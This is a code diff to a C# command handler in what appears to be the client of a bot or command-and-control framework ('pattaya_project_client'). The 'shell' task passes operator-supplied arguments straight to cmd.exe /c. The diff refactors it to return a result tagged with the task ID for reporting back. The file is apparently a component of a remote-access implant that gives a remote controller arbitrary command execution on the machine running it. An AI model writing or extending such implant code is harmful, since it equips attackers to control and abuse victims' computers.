@@ -1,6 +1,7 @@
 ﻿using pattaya_project_client.Commands.Interfaces;
 using pattaya_project_client.Models;
 using pattaya_project_client.Services;
+using System.IO;
 
 namespace pattaya_project_client.Commands.Implements
 {
@@ -8,9 +9,14 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "shell";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
-            return Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {task.Arguments}");
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {task.Arguments}")
+            };
+            
         }
     }
 }
